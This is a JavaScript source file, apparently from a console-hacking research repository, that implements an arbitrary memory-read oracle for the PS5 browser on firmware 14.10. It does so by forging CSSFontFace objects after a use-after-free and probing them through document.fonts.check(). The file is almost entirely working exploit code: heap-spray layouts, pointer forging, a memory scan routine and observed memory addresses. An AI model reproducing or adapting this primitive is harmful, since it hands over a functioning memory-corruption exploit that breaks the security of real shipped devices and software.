// oracle.js — PS5 14.10 FontFace UAF read primitive
// CC BY-NC 4.0 — github.com/ZigZagBoi1/PS5-14.10-Research
//
// Provides: heap-safe arbitrary-read oracle via document.fonts.check()
// Throughput: ~200K chk() calls/sec on PS5 browser
// Constraint: ONE UAF per browser session (second triggers OOM)
// Constraint: Number-only arithmetic (BigInt hangs the PS5 browser)
// Constraint: oracle cap 0x10FFFF — le32 values above this return E
//
// s6 extraction geometry:
//   s6p(rr(A)) = le48 at address A+2
//   works only when byte[0] and byte[1] of the target pointer are both zero
//   (i.e. the pointer is 64KB-aligned in its low 16 bits)
//
// CSSFontFace forged layout (192-byte spray buffer):
//   +0x00: [0,0,0,0x80, marker_lo, marker_hi, 0, 0]  — fake range MSB + id
//   +0x20: range_ptr (8 bytes) — pointed at by setR()
//   +0x28: count (u32=1)
//   +0x2C: capacity (u32=1)
//   +0x38: inline_from (u32=0x1000)
//   +0x3C: inline_to (u32=0x2000)
//   +0x82: status (u8=3 during spray, 0 during oracle)
//
// SELF scan uses a UNIQUE sentinel (0xBEEF/0xCAFE) on bufs[0] only;
// other buffers keep 0x1000/0x2000. Without this, all buffers match and
// the scan finds a random adjacent buffer instead of bufs[0].
//
// XO guard: vtable addresses < 0x810000000 are in execute-only text.
// Reading from them crashes the browser. L1-8 holds [7,8] which s6p
// decodes as 0x800000007 (text_base+7) — the guard skips it.
//
// Addresses found (this unit, 14.10, 46 boots):
//   text_base  = 0x800000000 (FIXED, XO — cannot read)
//   WPI        = 0x1000150000 (FIXED 8/9 boots, bmalloc slab header)
//   SELF       ~ 0x1000c20000–0x1000cf2000 (spray buffer, varies)
//   L1         ~ 0x1000848000–0x10009e7000 (varies, vector buffer, 7 entries)
//   L2         ~ 0x1000c4d000–0x1000c72000 (varies, struct with WPI ptr)

'use strict';

// --- helpers ---

function le48(v, o) {
  return v[o] + v[o+1]*0x100 + v[o+2]*0x10000 +
         v[o+3]*0x1000000 + v[o+4]*0x100000000 + v[o+5]*0x10000000000;
}

function wr48(u, o, x) {
  for (var k = 0; k < 6; k++) { u[o+k] = x % 256; x = Math.floor(x / 256); }
  u[o+6] = 0; u[o+7] = 0;
}

function put32(u, o, x) {
  u[o] = x & 0xFF; u[o+1] = (x>>8) & 0xFF;
  u[o+2] = (x>>16) & 0xFF; u[o+3] = (x>>24) & 0xFF;
}

function align256(x) { return Math.floor(x / 256) * 256; }

function hex(x) { return '0x' + Math.round(x).toString(16); }


// --- oracle state (set by init()) ---

var _bufs = null;   // array of [Uint8Array, L2, sprayIndex]
var _zi   = -1;     // oracle face index
var _self = 0;      // SELF address (forged CSSFontFace in spray)
var _L1   = 0;
var _L2   = 0;


// --- core primitives ---

// setR(addr): point all oracle buffers' range_ptr at addr
// after this call, chk() reads le32(addr) as 'from' and le32(addr+4) as 'to'
function setR(addr) {
  for (var i = 0; i < _bufs.length; i++) wr48(_bufs[i][0], 0x20, addr);
}

// chk(c): returns true if codepoint c IS in the unicode-range [from, to]
// semantics: document.fonts.check('1em zz'+_zi, char) === false
//   false from check() means "font claims codepoint but has no glyph" = IN range
function chk(c) {
  try {
    return document.fonts.check('1em zz' + _zi, String.fromCodePoint(c)) === false;
  } catch (e) { return null; }
}

// rr(addr): read le32(addr) as 'from' and le32(addr+4) as 'to'
// returns [from, to] where both are in [0, 0x10FFFF]
// returns [-2, -2] (E) when no codepoint matches (both values > 0x10FFFF, or from > to)
// CRASHES if addr is in XO text or unmapped memory
function rr(addr) {
  setR(addr);
  var c0 = chk(0), cM = chk(0x10FFFF);
  if (c0 && cM) return [0, 0x10FFFF];
  if (c0) {
    var lo = 0, hi = 0x10FFFF;
    while (lo < hi) { var m = (lo+hi+1)>>>1; if (chk(m)) lo = m; else hi = m-1; }
    return [0, lo];
  }
  if (cM) {
    var lo2 = 0, hi2 = 0x10FFFF;
    while (lo2 < hi2) { var m2 = (lo2+hi2)>>>1; if (chk(m2)) hi2 = m2; else lo2 = m2+1; }
    return [lo2, 0x10FFFF];
  }
  var seed = -1, v = 1;
  while (v <= 0x10FFFF) {
    if (chk(v)) { seed = v; break; }
    var v3 = v+v+v;
    if (v3 <= 0x10FFFF && chk(v3)) { seed = v3; break; }
    v = v*2;
  }
  if (seed < 0) return [-2, -2];
  var lo3 = 0, hi3 = seed;
  while (lo3 < hi3) { var m3 = (lo3+hi3)>>>1; if (chk(m3)) hi3 = m3; else lo3 = m3+1; }
  var fr = lo3;
  var lo4 = seed, hi4 = 0x10FFFF;
  while (lo4 < hi4) { var m4 = (lo4+hi4+1)>>>1; if (chk(m4)) lo4 = m4; else hi4 = m4-1; }
  return [fr, lo4];
}

// s6p(rv): extract a 6-byte LE pointer from an s6-shifted rr result
// usage: s6p(rr(addr - 2)) = le48 at addr
// only works when byte[0] and byte[1] of the pointer are both zero
function s6p(rv) {
  if (rv[0] === -2 || (rv[0] === 0 && rv[1] === 0x10FFFF)) return 0;
  var f = rv[0], t = rv[1];
  return ((f>>>16)&0xFF) + ((f>>>24)&0xFF)*256 +
         (t&0xFF)*65536 + ((t>>>8)&0xFF)*16777216 +
         ((t>>>16)&0xFF)*4294967296 + ((t>>>24)&0xFF)*1099511627776;
}

// rf(r): format an rr result for logging
function rf(r) { return r[0] === -2 ? 'E' : r[0].toString(16) + '/' + r[1].toString(16); }


// --- SELF scan ---
// finds bufs[0]'s address by its UNIQUE sentinel 0xBEEF/0xCAFE at +0x38/+0x3C
// other buffers have 0x1000/0x2000 so only bufs[0] matches

function findSelf(L1, L2) {
  var anchors = [align256(L1), align256(L2)];
  for (var an = 0; an < anchors.length; an++) {
    var cS = anchors[an] - 0x400000, cE = anchors[an] + 0x400000;
    if (cS < 0x10000) cS = 0x10000;
    for (var a = cS; a < cE; a += 128) {
      setR(a + 0x38);
      if (chk(0xBEEF) === true && chk(0xBEEE) === false &&
          chk(0xCAFE) === true && chk(0xCAFF) === false) {
        return a;
      }
    }
  }
  return 0;
}


// --- init ---
// call once after UAF + spray + face resolution
// sets up the oracle state: _bufs, _zi, _self, _L1, _L2
// returns { L1, L2, self, zi, bufs } or null on failure

function initOracle(sprayArr, faces) {
  var bufs = [], L1 = 0, L2 = 0;
  for (var i = 0; i < sprayArr.length; i++) {
    var a = le48(sprayArr[i], 0x58);
    if (a > 0x1000000000) {
      var b2 = le48(sprayArr[i], 0x68);
      if (L1 === 0) { L1 = a; L2 = b2; }
      bufs.push([sprayArr[i], b2, i]);
    }
  }
  if (!bufs.length) return null;

  // forge oracle buffers
  for (var ib = 0; ib < bufs.length; ib++) {
    var vb = bufs[ib][0];
    vb[0] = 2;
    wr48(vb, 0x08, bufs[ib][1]);
    wr48(vb, 0x10, 0);
    vb[0x82] = 0;
    wr48(vb, 0x20, 0);
    put32(vb, 0x28, 0);
    put32(vb, 0x2C, 0);
  }

  // rename faces and add to document.fonts
  for (var i2 = 0; i2 < faces.length; i2++) {
    try { faces[i2].family = 'zz' + i2; } catch (e) {}
  }
  for (var i3 = 0; i3 < faces.length; i3++) {
    try { document.fonts.add(faces[i3]); } catch (e) {}
  }

  // find oracle face
  var zi = -1;
  for (var q = 0; q < faces.length; q++) {
    var r = null;
    try { r = document.fonts.check('1em zz' + q, 'A'); } catch (e) { r = 'EX'; }
    if (r === false) { zi = q; break; }
  }
  if (zi < 0) return null;

  // set oracle geometry: count=1, capacity=1, point at L2
  for (var ip = 0; ip < bufs.length; ip++) {
    bufs[ip][0][0x82] = 0;
    wr48(bufs[ip][0], 0x20, L2);
    bufs[ip][0][0x28] = 1;
    bufs[ip][0][0x2C] = 1;
  }
  // unique sentinel on bufs[0], standard on the rest
  put32(bufs[0][0], 0x38, 0xBEEF);
  put32(bufs[0][0], 0x3C, 0xCAFE);
  for (var iq = 1; iq < bufs.length; iq++) {
    put32(bufs[iq][0], 0x38, 0x1000);
    put32(bufs[iq][0], 0x3C, 0x2000);
  }

  // store state
  _bufs = bufs;
  _zi = zi;
  _L1 = L1;
  _L2 = L2;

  // SELF scan
  _self = findSelf(L1, L2);

  return { L1: L1, L2: L2, self: _self, zi: zi, bufs: bufs };
}


// --- cleanup ---
// restore safe state before page unload or end of probe

function cleanup() {
  if (!_bufs || !_bufs.length) return;
  var h0 = _bufs[0][0];
  put32(h0, 0x38, 0xBEEF);
  put32(h0, 0x3C, 0xCAFE);
  if (_self) setR(_self + 0x38);
}
